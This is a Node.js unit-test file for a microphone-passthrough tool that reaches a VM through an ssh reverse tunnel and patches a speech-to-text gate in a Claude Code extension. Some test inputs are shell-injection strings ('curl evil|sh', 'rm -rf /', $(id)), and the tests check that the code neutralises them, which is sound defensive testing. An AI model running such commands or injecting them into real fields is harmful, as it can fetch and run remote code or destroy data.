"use strict";
// Plain-node unit tests for the mic-passthrough host logic (src/audio.js).
//
// Covered thoroughly (the pure/testable core):
//   • the guard-patch transform — apply / revert / double-apply idempotency /
//     round-trip / adversarial inputs, against a REALISTIC minified gate snippet
//     mirroring the installed anthropic.claude-code-*/extension.js;
//   • the vm/ script builders — base64-as-data (no interpolation), injection-safe
//     ports, the shim + script contents ride as data, exit-code plumbing;
//   • the `ssh -R` reverse-tunnel argv builder — loopback-only forward, key/alias
//     branches, port validation, -N / ExitOnForwardFailure;
//   • format/port constants + normalizePort adversarial coercion;
//   • the on-demand gating (AudioSession) — arm on connect, release on disconnect,
//     newest-wins, disposed-post safety — via a fake net;
//   • the enable/disable orchestration (HostAudio) — injected ssh runner + spawner,
//     rollback on failure, unreachable/exception handling, dispose cleanup.
//
// NOT covered here (runtime-only, exercised on this VM by hand + bash -n): the real
// getUserMedia capture, a live VM's shim streaming, and the actual SSH connection.
// Run:  node audio.test.js
const assert = require("assert");
const { EventEmitter } = require("events");
const a = require("../src/audio");
const ssh = require("../src/ssh");

let pass = 0, fail = 0;
function ok(name, cond, detail) {
  if (cond) { pass++; console.log("  PASS  " + name); }
  else { fail++; console.log("  FAIL  " + name + (detail ? "   << " + detail : "")); }
}
const eq = (name, got, want) => ok(name, got === want, `got ${JSON.stringify(got)} want ${JSON.stringify(want)}`);

// ── A realistic minified gate snippet (mirrors the real 2.1.x extension.js) ──────
// Note the OTHER two remoteName uses (comma + brace) that must NOT be rewritten,
// and the differing minified object prefix `le.env.` (version-generic anchor).
const GATE_SNIPPET =
  'x={initialMessages:!le.env.remoteName,agentProgress:1},' +
  'openURL(e){if(le.env.remoteName){let t=process.platform;return t}},' +
  'isSpeechToTextEnabled(){if(le.env.remoteName)return!1;if(this.authManager.getAuthStatus()?.authMethod!=="claudeai")return!1;return l5()}';

// ── Guard patch: apply ───────────────────────────────────────────────────────
(() => {
  const r = a.applyGuardPatch(GATE_SNIPPET);
  ok("apply: reports changed", r.changed === true);
  ok("apply: gate neutralised (remoteName&&!1)", r.source.indexOf("remoteName&&!1)return!1") !== -1);
  ok("apply: original gate gone", r.source.indexOf("remoteName)return!1") === -1);
  // The two decoy remoteName uses survive verbatim.
  ok("apply: leaves initialMessages remoteName use", r.source.indexOf("!le.env.remoteName,agentProgress") !== -1);
  ok("apply: leaves openURL remoteName use", r.source.indexOf("if(le.env.remoteName){let t=process") !== -1);
  // The auth-method check is untouched.
  ok("apply: leaves the authMethod check intact", r.source.indexOf('authMethod!=="claudeai")return!1') !== -1);
  // Only ONE substitution happened (exactly one gate on real builds).
  eq("apply: exactly one patched marker", (r.source.match(/remoteName&&!1\)return!1/g) || []).length, 1);
})();

// ── Guard patch: idempotency (double-apply is a no-op) ───────────────────────
(() => {
  const once = a.applyGuardPatch(GATE_SNIPPET).source;
  const twice = a.applyGuardPatch(once);
  ok("apply x2: reports NOT changed", twice.changed === false);
  eq("apply x2: byte-identical to single apply", twice.source, once);
  ok("isGuardPatched true after apply", a.isGuardPatched(once) === true);
  ok("isGuardPatched false on original", a.isGuardPatched(GATE_SNIPPET) === false);
  ok("hasGuardGate true on original", a.hasGuardGate(GATE_SNIPPET) === true);
  ok("hasGuardGate false on patched", a.hasGuardGate(once) === false);
})();

// ── Guard patch: revert + round-trip ─────────────────────────────────────────
(() => {
  const patched = a.applyGuardPatch(GATE_SNIPPET).source;
  const rev = a.revertGuardPatch(patched);
  ok("revert: reports changed", rev.changed === true);
  eq("revert: restores the ORIGINAL byte-for-byte", rev.source, GATE_SNIPPET);
  // Reverting an already-original is a no-op.
  const revAgain = a.revertGuardPatch(rev.source);
  ok("revert x2: reports NOT changed", revAgain.changed === false);
  eq("revert x2: unchanged", revAgain.source, GATE_SNIPPET);
  // Full round-trip apply→revert→apply is stable.
  const round = a.applyGuardPatch(a.revertGuardPatch(a.applyGuardPatch(GATE_SNIPPET).source).source).source;
  eq("round-trip apply/revert/apply matches single apply", round, patched);
})();

// ── Guard patch: adversarial / degenerate inputs ─────────────────────────────
(() => {
  eq("apply: no-gate build left untouched", a.applyGuardPatch("function noGateHere(){return 1}").changed, false);
  eq("apply: empty string", a.applyGuardPatch("").changed, false);
  eq("apply: null coerces safely", a.applyGuardPatch(null).source, "");
  eq("apply: undefined coerces safely", a.applyGuardPatch(undefined).source, "");
  eq("revert: no-patch build left untouched", a.revertGuardPatch("nothing here").changed, false);
  eq("revert: null coerces safely", a.revertGuardPatch(null).source, "");
  // A file that ALREADY contains our patched form (older enable) is recognised, so
  // apply won't double-patch and revert works.
  const already = "isSpeechToTextEnabled(){if(env.remoteName&&!1)return!1;return l5()}";
  eq("apply: recognises pre-patched (no change)", a.applyGuardPatch(already).changed, false);
  eq("revert: reverts pre-patched form", a.revertGuardPatch(already).source.indexOf("remoteName)return!1") !== -1, true);
  // Only the FIRST gate is rewritten if (hypothetically) two exist.
  const twoGates = "a=remoteName)return!1;b=remoteName)return!1";
  const p2 = a.applyGuardPatch(twoGates);
  eq("apply: rewrites only the first of two gates", p2.source, "a=remoteName&&!1)return!1;b=remoteName)return!1");
})();

// ── Constants ────────────────────────────────────────────────────────────────
(() => {
  eq("FORMAT sampleRate 16000", a.FORMAT.sampleRate, 16000);
  eq("FORMAT channels 1 (mono)", a.FORMAT.channels, 1);
  eq("FORMAT bitDepth 16", a.FORMAT.bitDepth, 16);
  eq("FORMAT encoding signed", a.FORMAT.encoding, "signed");
  eq("FORMAT endianness le", a.FORMAT.endianness, "le");
  eq("BYTES_PER_FRAME = 2 (mono S16)", a.BYTES_PER_FRAME, 2);
  ok("FORMAT is frozen", Object.isFrozen(a.FORMAT));
  eq("DEFAULT_VM_PORT 8767", a.DEFAULT_VM_PORT, 8767);
  eq("REC_SHIM_PATH", a.REC_SHIM_PATH, "/usr/local/bin/rec");
  eq("ARECORD_SHIM_PATH", a.ARECORD_SHIM_PATH, "/usr/local/bin/arecord");
  // The recorder argv matches Claude's contract EXACTLY.
  eq("REC_ARGV matches contract", a.REC_ARGV.join(" "), "-q --buffer 1024 -t raw -r 16000 -e signed -b 16 -c 1 -");
  eq("ARECORD_ARGV matches contract", a.ARECORD_ARGV.join(" "), "-q -f S16_LE -r 16000 -c 1 -t raw");
})();

// ── normalizePort ────────────────────────────────────────────────────────────
(() => {
  eq("port: valid passes through", a.normalizePort(8767, 0), 8767);
  eq("port: 0 (ephemeral) is valid", a.normalizePort(0, 5), 0);
  eq("port: 65535 boundary", a.normalizePort(65535, 0), 65535);
  eq("port: 65536 out of range -> default", a.normalizePort(65536, 8767), 8767);
  eq("port: negative -> default", a.normalizePort(-1, 8767), 8767);
  eq("port: non-integer -> default", a.normalizePort(80.5, 8767), 8767);
  eq("port: NaN -> default", a.normalizePort(NaN, 8767), 8767);
  eq("port: string -> default (no coercion of injection)", a.normalizePort("8767; rm -rf /", 8767), 8767);
  eq("port: null -> default", a.normalizePort(null, 8767), 8767);
  eq("port: undefined -> default", a.normalizePort(undefined, 8767), 8767);
})();

// ── Script builders: base64-as-data, injection-safety ────────────────────────
(() => {
  const shim = "#!/usr/bin/env bash\n# shim\nexit 0\n";
  const enableTxt = "#!/usr/bin/env bash\n# enable\nexit 0\n";
  const script = a.buildEnableScript(enableTxt, shim, 8767);
  ok("enable-script: sets validated integer port", script.indexOf("CONSTRUCT_VM_PORT=8767") !== -1);
  ok("enable-script: embeds shim as base64 data", script.indexOf(a.b64(shim)) !== -1);
  ok("enable-script: embeds enable script as base64 data", script.indexOf(a.b64(enableTxt)) !== -1);
  // The RAW shim text must NOT appear literally (it rides as base64), so nothing in
  // the shim can be re-parsed by the outer shell.
  ok("enable-script: raw shim text not interpolated", script.indexOf("# shim") === -1);
  ok("enable-script: decodes + runs via mktemp/base64 -d/bash", /base64 -d .*bash "\$f"/.test(script));
  ok("enable-script: propagates the inner exit code", script.indexOf("exit $rc") !== -1);

  // A hostile port can't inject — it's coerced to the default integer.
  const evil = a.buildEnableScript(enableTxt, shim, "8767; curl evil|sh");
  ok("enable-script: hostile port coerced to default (no injection)", evil.indexOf("CONSTRUCT_VM_PORT=8767") !== -1);
  ok("enable-script: hostile port string absent", evil.indexOf("curl evil") === -1);

  // A shim containing shell metacharacters / quotes is fully neutralised by base64.
  const nasty = "'; rm -rf /; echo '\n`whoami`\n$(id)\n";
  const s2 = a.buildEnableScript(enableTxt, nasty, 8767);
  ok("enable-script: nasty shim metachars not present literally", s2.indexOf("rm -rf /") === -1 && s2.indexOf("`whoami`") === -1 && s2.indexOf("$(id)") === -1);
  ok("enable-script: nasty shim recoverable from its base64", Buffer.from(a.b64(nasty), "base64").toString("utf8") === nasty);

  const disableTxt = "#!/usr/bin/env bash\n# disable\nexit 0\n";
  const dscript = a.buildDisableScript(disableTxt);
  ok("disable-script: embeds disable script as base64 data", dscript.indexOf(a.b64(disableTxt)) !== -1);
  ok("disable-script: raw disable text not interpolated", dscript.indexOf("# disable") === -1);
  ok("disable-script: decodes + runs + exits with inner code", /base64 -d .*bash "\$f"/.test(dscript) && dscript.indexOf("exit $rc") !== -1);
})();

// ── b64 helper ───────────────────────────────────────────────────────────────
(() => {
  eq("b64 round-trips utf8", Buffer.from(a.b64("héllo → world"), "base64").toString("utf8"), "héllo → world");
  ok("b64 output is shell-safe (no metachars)", /^[A-Za-z0-9+/=]*$/.test(a.b64("anything ' \" ` $ ;")));
})();

// ── ssh -R reverse-tunnel argv ───────────────────────────────────────────────
(() => {
  const cfg = ssh.resolveCfg({});
  const withKey = a.buildTunnelArgs(ssh, undefined, 8767, 51234, true);
  const forwardIdx = withKey.indexOf("-R");
  ok("tunnel: has -R forward", forwardIdx !== -1);
  eq("tunnel: forward is vm:port -> 127.0.0.1:hostPort (LOOPBACK only)", withKey[forwardIdx + 1], "8767:127.0.0.1:51234");
  ok("tunnel: -N (no remote command)", withKey.indexOf("-N") !== -1);
  ok("tunnel: BatchMode=yes", withKey.indexOf("BatchMode=yes") !== -1);
  ok("tunnel: ExitOnForwardFailure=yes (fail fast on bind clash)", withKey.indexOf("ExitOnForwardFailure=yes") !== -1);
  ok("tunnel: ServerAliveInterval set (detect dead link)", withKey.indexOf("ServerAliveInterval=15") !== -1);
  ok("tunnel: with key uses -i + IdentitiesOnly", withKey.indexOf("-i") !== -1 && withKey.indexOf("IdentitiesOnly=yes") !== -1);
  eq("tunnel: with key targets user@host", withKey[withKey.length - 1], `${cfg.user}@${cfg.vmHost}`);
  ok("tunnel: with key carries the key path", withKey.indexOf(ssh.keyPath(cfg)) !== -1);
  // No trailing remote command (unlike runRemote): last token is the destination.
  ok("tunnel: no remote command after destination", withKey.indexOf("-N") < withKey.length - 1);

  const noKey = a.buildTunnelArgs(ssh, undefined, 8767, 51234, false);
  eq("tunnel: without key targets the host alias", noKey[noKey.length - 1], cfg.hostAlias);
  ok("tunnel: without key has no -i", noKey.indexOf("-i") === -1);

  // Ports are validated in the argv too.
  const badPorts = a.buildTunnelArgs(ssh, undefined, "8767|sh", 999999, true);
  const bi = badPorts.indexOf("-R");
  eq("tunnel: hostile ports coerced (vm->default, host->0)", badPorts[bi + 1], "8767:127.0.0.1:0");
})();

// ── AudioSession: on-demand gating via fake net ──────────────────────────────
// A fake net whose createServer captures the connection handler so the test can
// simulate the VM shim connecting/disconnecting.
function fakeNet() {
  const state = { handler: null, listening: false, port: null, closed: false, listenErr: false };
  const server = new EventEmitter();
  server.listen = (port, host, cb) => {
    if (state.listenErr) { setImmediate(() => server.emit("error", new Error("EADDRINUSE"))); return server; }
    state.listening = true;
    state.port = port === 0 ? 55555 : port;
    if (cb) setImmediate(cb);
    return server;
  };
  server.address = () => (state.listening ? { port: state.port } : null);
  server.close = () => { state.closed = true; };
  const net = {
    createServer: (h) => { state.handler = h; return server; },
  };
  return { net, state, server };
}
function fakeSocket() {
  const s = new EventEmitter();
  s.destroyed = false;
  s.written = [];
  s.write = (b) => { s.written.push(b); return true; };
  s.end = () => { s.ended = true; s.emit("end"); };
  s.destroy = () => { s.destroyed = true; s.emit("close"); };
  return s;
}

(async () => {
  // listen resolves the OS-chosen port.
  {
    const { net } = fakeNet();
    const events = [];
    const sess = new a.AudioSession({ _net: net, onCapture: () => () => {}, onState: (i) => events.push(i) });
    const port = await sess.listen(0);
    eq("session: listen resolves ephemeral port", port, 55555);
  }
  // A connection ARMS capture; a disconnect RELEASES it (on-demand).
  {
    const fn = fakeNet();
    let armed = 0, released = 0, chunks = [];
    const sess = new a.AudioSession({
      _net: fn.net,
      onCapture: (writeChunk) => { armed++; writeChunk(Buffer.from([1, 2])); return () => { released++; }; },
      onState: () => {},
    });
    await sess.listen(0);
    const sock = fakeSocket();
    fn.state.handler(sock);
    eq("session: connect arms the mic", armed, 1);
    ok("session: PCM chunk written to the socket", sock.written.length === 1 && sock.written[0].length === 2);
    // Disconnect → release.
    sock.emit("close");
    eq("session: disconnect releases the mic", released, 1);
  }
  // Newest connection wins: a second connection releases the first.
  {
    const fn = fakeNet();
    let released = 0;
    const sess = new a.AudioSession({ _net: fn.net, onCapture: () => () => { released++; }, onState: () => {} });
    await sess.listen(0);
    const s1 = fakeSocket(), s2 = fakeSocket();
    fn.state.handler(s1);
    fn.state.handler(s2); // should release s1 first
    eq("session: second connection releases the first (newest wins)", released, 1);
    ok("session: first socket destroyed on takeover", s1.destroyed === true);
  }
  // onState reports capturing true then false.
  {
    const fn = fakeNet();
    const states = [];
    const sess = new a.AudioSession({ _net: fn.net, onCapture: () => () => {}, onState: (i) => states.push(i.capturing) });
    await sess.listen(0);
    const sock = fakeSocket();
    fn.state.handler(sock);
    sock.emit("close");
    ok("session: onState saw capturing true then false", states.includes(true) && states.includes(false));
  }
  // A capture that THROWS on arm (mic blocked) closes the socket + reports error.
  {
    const fn = fakeNet();
    let err = null;
    const sess = new a.AudioSession({
      _net: fn.net,
      onCapture: () => { throw new Error("NotAllowedError"); },
      onState: (i) => { if (i.error) err = i.error; },
    });
    await sess.listen(0);
    const sock = fakeSocket();
    fn.state.handler(sock);
    eq("session: arm-throw reports capture-failed", err, "capture-failed");
    ok("session: arm-throw destroys the socket (shim gets EOF)", sock.destroyed === true);
  }
  // listen error resolves null (honest failure).
  {
    const fn = fakeNet();
    fn.state.listenErr = true;
    const sess = new a.AudioSession({ _net: fn.net, onCapture: () => () => {}, onState: () => {} });
    const port = await sess.listen(0);
    eq("session: listen error -> null port", port, null);
  }
  // close() after a connection releases + closes; a connection after close is dropped.
  {
    const fn = fakeNet();
    let released = 0;
    const sess = new a.AudioSession({ _net: fn.net, onCapture: () => () => { released++; }, onState: () => {} });
    await sess.listen(0);
    const sock = fakeSocket();
    fn.state.handler(sock);
    sess.close();
    eq("session: close releases active capture", released, 1);
    ok("session: close closes the server", fn.state.closed === true);
    // A late connection is destroyed, not armed.
    const late = fakeSocket();
    fn.state.handler(late);
    ok("session: connection after close is dropped", late.destroyed === true);
    // Double close is a no-op.
    sess.close();
    eq("session: double-close doesn't re-release", released, 1);
  }

  // ── HostAudio orchestration (injected ssh runner + spawner) ─────────────────
  // A fake ssh module: records the scripts it was handed and returns a scripted code.
  function fakeSsh(codes) {
    const calls = [];
    return {
      calls,
      resolveCfg: ssh.resolveCfg,
      keyPath: ssh.keyPath,
      runRemoteScript: (script, opts) => {
        calls.push({ script, opts });
        const c = codes.shift();
        return Promise.resolve(typeof c === "object" ? c : { code: c == null ? 0 : c, stdout: "", stderr: "" });
      },
    };
  }
  function fakeSpawner(sink) {
    return (file, args, opts) => {
      sink.file = file; sink.args = args; sink.opts = opts; sink.killed = false;
      const child = new EventEmitter();
      child.kill = () => { sink.killed = true; };
      return child;
    };
  }
  const readScript = (b) => "#!/usr/bin/env bash\n# " + b + "\nexit 0\n";

  // Enable: happy path — runs enable, opens server, spawns tunnel, reports enabled.
  {
    const fs = fakeSsh([0]); // enable succeeds
    const sink = {};
    const fn = fakeNet();
    const statuses = [];
    const h = new a.HostAudio({
      _ssh: fs, _spawn: fakeSpawner(sink), _net: fn.net, _readScript: readScript, _hasKey: () => true,
      mic: () => () => {}, onStatus: (s) => statuses.push(s), _tunnelSettleMs: 5,
    });
    const r = await h.enable();
    ok("hostaudio enable: ok", r.ok === true);
    ok("hostaudio enable: ran the enable script over ssh", fs.calls.length === 1 && fs.calls[0].script.indexOf("CONSTRUCT_VM_PORT=8767") !== -1);
    ok("hostaudio enable: spawned ssh -R tunnel", sink.file === "ssh" && sink.args.indexOf("-R") !== -1);
    ok("hostaudio enable: tunnel forwards to the chosen host port", sink.args[sink.args.indexOf("-R") + 1] === "8767:127.0.0.1:55555");
    ok("hostaudio enable: reported enabled with tunnel label", statuses.some((s) => s.enabled === true && /vm:8767/.test(s.tunnel || "")));
    eq("hostaudio enable: state enabled", h.enabled, true);
    // dispose kills the tunnel + closes the server.
    h.dispose();
    ok("hostaudio dispose: killed the tunnel", sink.killed === true);
    ok("hostaudio dispose: closed the server", fn.state.closed === true);
    eq("hostaudio dispose: not enabled", h.enabled, false);
  }
  // Enable: VM unreachable (code < 0) → not ok, no tunnel spawned, honest error.
  {
    const fs = fakeSsh([{ code: -1, stdout: "", stderr: "" }]);
    const sink = {};
    const statuses = [];
    const h = new a.HostAudio({ _ssh: fs, _spawn: fakeSpawner(sink), _net: fakeNet().net, _readScript: readScript, _hasKey: () => true, mic: () => () => {}, onStatus: (s) => statuses.push(s) });
    const r = await h.enable();
    eq("hostaudio enable unreachable: not ok", r.ok, false);
    eq("hostaudio enable unreachable: error=unreachable", r.error, "unreachable");
    ok("hostaudio enable unreachable: no tunnel spawned", sink.file === undefined);
    ok("hostaudio enable unreachable: reported disabled", statuses.some((s) => s.enabled === false && s.error === "unreachable"));
  }
  // Enable: enable script fails (code>0) → error=enable-failed.
  {
    const fs = fakeSsh([2]);
    const h = new a.HostAudio({ _ssh: fs, _spawn: fakeSpawner({}), _net: fakeNet().net, _readScript: readScript, _hasKey: () => true, mic: () => () => {} });
    const r = await h.enable();
    eq("hostaudio enable-failed: error", r.error, "enable-failed");
  }
  // Enable: gate-patch result from stdout is surfaced honestly (gatePatched true/false).
  {
    const fsY = fakeSsh([{ code: 0, stdout: "construct-audio-enable: enable complete.\nCONSTRUCT_GATE_PATCHED=1\n", stderr: "" }]);
    const hY = new a.HostAudio({ _ssh: fsY, _spawn: fakeSpawner({}), _net: fakeNet().net, _readScript: readScript, _hasKey: () => true, mic: () => () => {}, _tunnelSettleMs: 5 });
    await hY.enable();
    eq("hostaudio enable: gatePatched=1 -> true", hY.gatePatched, true);
    const stat = [];
    const fsN = fakeSsh([{ code: 0, stdout: "CONSTRUCT_GATE_PATCHED=0\n", stderr: "" }]);
    const hN = new a.HostAudio({ _ssh: fsN, _spawn: fakeSpawner({}), _net: fakeNet().net, _readScript: readScript, _hasKey: () => true, mic: () => () => {}, onStatus: (s) => stat.push(s), _tunnelSettleMs: 5 });
    await hN.enable();
    eq("hostaudio enable: gatePatched=0 -> false", hN.gatePatched, false);
    ok("hostaudio enable: enabled status carries gatePatched", stat.some((s) => s.enabled === true && s.gatePatched === false));
  }
  // Enable: local server fails to bind → rollback tears down local AND reverts the VM
  // (the remote enable already ran), error=server-failed, no tunnel.
  {
    const fs = fakeSsh([0, 0]); // enable, then the rollback disable
    const fn = fakeNet(); fn.state.listenErr = true;
    const sink = {};
    const h = new a.HostAudio({ _ssh: fs, _spawn: fakeSpawner(sink), _net: fn.net, _readScript: readScript, _hasKey: () => true, mic: () => () => {} });
    const r = await h.enable();
    eq("hostaudio server-failed: error", r.error, "server-failed");
    ok("hostaudio server-failed: no tunnel spawned", sink.file === undefined);
    ok("hostaudio server-failed: rolled back the VM (ran remote disable)", fs.calls.length === 2 && fs.calls[1].script.indexOf("CONSTRUCT_DISABLE_B64") !== -1);
  }
  // Enable: tunnel spawn throws → rollback (local close + remote revert), error=tunnel-failed.
  {
    const fs = fakeSsh([0, 0]); // enable, then the rollback disable
    const fn = fakeNet();
    const h = new a.HostAudio({
      _ssh: fs, _spawn: () => { throw new Error("no ssh"); }, _net: fn.net,
      _readScript: readScript, _hasKey: () => true, mic: () => () => {},
    });
    const r = await h.enable();
    eq("hostaudio tunnel-failed: error", r.error, "tunnel-failed");
    ok("hostaudio tunnel-failed: server closed (rollback)", fn.state.closed === true);
    ok("hostaudio tunnel-failed: rolled back the VM (ran remote disable)", fs.calls.length === 2 && fs.calls[1].script.indexOf("CONSTRUCT_DISABLE_B64") !== -1);
    eq("hostaudio tunnel-failed: not enabled", h.enabled, false);
  }
  // Enable: tunnel SPAWNS but ssh dies right after (missing binary / connect fail /
  // ExitOnForwardFailure) — the death arrives ASYNC via exit AFTER _spawn() returned.
  // enable() must confirm the settle window, catch it as tunnel-failed, and roll back
  // BOTH sides — never report success with no live tunnel behind it.
  {
    const fs = fakeSsh([0, 0]); // enable, then the rollback disable
    const fn = fakeNet();
    const sink = {};
    const spawnDying = (file, args) => {
      sink.file = file; sink.args = args; sink.killed = false;
      const child = new EventEmitter();
      child.kill = () => { sink.killed = true; };
      setImmediate(() => child.emit("exit", 1)); // ssh exits shortly after spawn
      return child;
    };
    const h = new a.HostAudio({
      _ssh: fs, _spawn: spawnDying, _net: fn.net, _readScript: readScript,
      _hasKey: () => true, mic: () => () => {}, _tunnelSettleMs: 80,
    });
    const r = await h.enable();
    eq("hostaudio tunnel dies early: error=tunnel-failed", r.error, "tunnel-failed");
    eq("hostaudio tunnel dies early: not enabled", h.enabled, false);
    ok("hostaudio tunnel dies early: server closed (rollback)", fn.state.closed === true);
    ok("hostaudio tunnel dies early: rolled back the VM (ran remote disable)", fs.calls.length === 2 && fs.calls[1].script.indexOf("CONSTRUCT_DISABLE_B64") !== -1);
  }
  // Tunnel dies AFTER a good start → passthrough flips OFF honestly (enabled=false, a
  // tunnel-down status), so the UI can't keep showing armed with no tunnel. No remote
  // disable — the shim/patch are inert without a tunnel (a re-enable re-establishes).
  {
    const fs = fakeSsh([0]);
    const fn = fakeNet();
    let child = null;
    const spawnLater = (file, args) => { child = new EventEmitter(); child.kill = () => {}; return child; };
    const statuses = [];
    const h = new a.HostAudio({
      _ssh: fs, _spawn: spawnLater, _net: fn.net, _readScript: readScript,
      _hasKey: () => true, mic: () => () => {}, _tunnelSettleMs: 20, onStatus: (s) => statuses.push(s),
    });
    const r = await h.enable();
    ok("hostaudio later death: enabled after a good start", r.ok === true && h.enabled === true);
    child.emit("exit", 1); // the tunnel drops later
    eq("hostaudio later death: flips enabled off", h.enabled, false);
    ok("hostaudio later death: reported disabled + tunnel-down", statuses.some((s) => s.enabled === false && s.error === "tunnel-down"));
    ok("hostaudio later death: no remote disable (shim inert without a tunnel)", fs.calls.length === 1);
  }
  // Disable: releases locally FIRST, then runs the disable script.
  {
    const fs = fakeSsh([0, 0]); // enable, then disable
    const sink = {};
    const fn = fakeNet();
    const h = new a.HostAudio({ _ssh: fs, _spawn: fakeSpawner(sink), _net: fn.net, _readScript: readScript, _hasKey: () => true, mic: () => () => {}, _tunnelSettleMs: 5 });
    await h.enable();
    const r = await h.disable();
    ok("hostaudio disable: ok", r.ok === true);
    ok("hostaudio disable: ran the disable script", fs.calls.length === 2);
    ok("hostaudio disable: killed the tunnel", sink.killed === true);
    ok("hostaudio disable: closed the server", fn.state.closed === true);
    eq("hostaudio disable: not enabled", h.enabled, false);
  }
  // Disable when VM unreachable for cleanup: local side still released, ok=false.
  {
    const fs = fakeSsh([0, { code: -1, stdout: "", stderr: "" }]);
    const sink = {};
    const fn = fakeNet();
    const h = new a.HostAudio({ _ssh: fs, _spawn: fakeSpawner(sink), _net: fn.net, _readScript: readScript, _hasKey: () => true, mic: () => () => {}, _tunnelSettleMs: 5 });
    await h.enable();
    const r = await h.disable();
    eq("hostaudio disable unreachable: ok=false (cleanup didn't run)", r.ok, false);
    ok("hostaudio disable unreachable: still released locally (tunnel killed)", sink.killed === true);
  }
  // Double-enable is a no-op (guards re-entrancy).
  {
    const fs = fakeSsh([0]);
    const sink = {};
    const h = new a.HostAudio({ _ssh: fs, _spawn: fakeSpawner(sink), _net: fakeNet().net, _readScript: readScript, _hasKey: () => true, mic: () => () => {}, _tunnelSettleMs: 5 });
    await h.enable();
    const r2 = await h.enable();
    ok("hostaudio double-enable: no second enable script", fs.calls.length === 1);
    ok("hostaudio double-enable: reports ok (already enabled)", r2.ok === true);
    h.dispose();
  }
  // readScript throwing (missing vm file) is caught → error=exception, rollback.
  {
    const fs = fakeSsh([0]);
    const fn = fakeNet();
    const h = new a.HostAudio({ _ssh: fs, _spawn: fakeSpawner({}), _net: fn.net, _readScript: () => { throw new Error("ENOENT"); }, _hasKey: () => true, mic: () => () => {} });
    const r = await h.enable();
    eq("hostaudio enable: readScript throw -> exception", r.error, "exception");
    ok("hostaudio enable: no ssh call when scripts unreadable", fs.calls.length === 0);
  }

  console.log(`\n  audio unit tests — ${pass}/${pass + fail} passed\n`);
  process.exit(fail ? 1 : 0);
})();
